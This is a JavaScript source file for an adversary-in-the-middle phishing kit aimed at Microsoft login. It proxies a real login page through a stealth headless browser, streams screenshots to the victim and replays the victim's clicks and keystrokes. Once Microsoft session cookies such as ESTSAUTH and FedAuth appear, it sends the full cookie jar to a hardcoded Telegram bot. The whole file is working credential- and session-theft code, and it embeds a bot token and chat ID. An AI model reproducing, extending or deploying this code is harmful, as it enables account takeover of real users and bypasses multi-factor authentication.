const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';
const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

async function sendExfiltrationAlert(cookies, finalUrl, source) {
    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        const host = new URL(finalUrl).hostname;
        const textAlert = `<b>🚨 STAGE CAPTURE: ${host}</b>\n\n<b>Trigger:</b> <code>${source}</code>\n<b>Tokens:</b> ${cookies.length}\n\n<i>Note: Capture logic matched domain-specific auth signatures.</i>`;
        
        await axios.post(msgUrl, { chat_id: CHAT_ID, text: textAlert, parse_mode: 'HTML' });

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', `Auth Jar [${host}]`);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2), 'utf-8'), {
            filename: `JAR_${host.replace(/\./g, '_')}_${Date.now()}.json`,
            contentType: 'application/json'
        });

        await axios.post(docUrl, form, { headers: form.getHeaders() });
    } catch (e) {
        console.error('[TELEGRAM-ERR]', e.message);
    }
}

async function startSession(io, socket) {
    let browser;
    // Track captured domains to allow multi-stage exfiltration without spamming
    const capturedDomains = new Set(); 

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        const attemptExfiltration = async (source) => {
            try {
                const url = page.url().toLowerCase();
                if (url === 'about:blank') return;
                
                const host = new URL(url).hostname;
                if (capturedDomains.has(host)) return;

                const cookies = await page.cookies();
                
                // 2026 Master & Service Tokens
                const criticalTokens = [
                    'ESTSAUTHPERSISTENT', 'ESTSAUTH', 'CCState', 
                    '__Host-MSAAUTH', 'RPSSecAuth', 'FedAuth', 'OutlookSession'
                ];
                
                const hasValidAuth = cookies.some(c => criticalTokens.some(t => c.name.includes(t)));

                // Prevent early fire on login-hint pages
                if (hasValidAuth && !url.includes('/oauth20_authorize.srf')) {
                    capturedDomains.add(host); 
                    console.log(`[STAGE-SUCCESS] Captured ${host} via ${source}`);
                    
                    // Allow background XHRs to complete
                    await new Promise(r => setTimeout(r, 4500));
                    
                    const finalJar = await page.cookies();
                    await sendExfiltrationAlert(finalJar, url, source);
                }
            } catch (e) {
                console.error('[INTERNAL-CHECK-ERR]', e.message);
            }
        };

        // Network Interception (Catches KMSI/Token responses)
        page.on('response', async (response) => {
            const url = response.url().toLowerCase();
            if (url.includes('/kmsi') || url.includes('/token') || url.includes('landingv2')) {
                await attemptExfiltration('Network-Intercept');
            }
        });

        // Navigation Watcher
        page.on('framenavigated', async (frame) => {
            await attemptExfiltration('Navigation-Trigger');
        });

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
        const heartbeat = setInterval(emitFrame, 1200);
        const poller = setInterval(() => attemptExfiltration('Periodic-Poll'), 4000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y, { delay: 60 });
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
                await emitFrame();
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(poller);
            if (browser) await browser.close();
        });

    } catch (error) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
